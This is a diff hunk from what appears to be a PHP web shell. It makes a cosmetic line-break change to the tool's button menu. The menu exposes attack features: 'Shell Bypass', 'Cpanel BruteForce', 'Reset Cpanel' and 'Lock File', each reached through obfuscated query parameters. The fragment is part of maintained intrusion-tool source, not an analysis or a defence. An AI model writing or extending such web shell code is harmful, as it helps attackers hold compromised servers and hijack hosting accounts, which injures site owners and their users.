@@ -749,7 +749,7 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet">Lock File</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("shell-bypass").'=opet">Shell Bypass</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("string-tools").'=opet">String Tools</button>
-<br>
+<br><br>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("cpbrute").'=opet">Cpanel BruteForce</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
         exit();
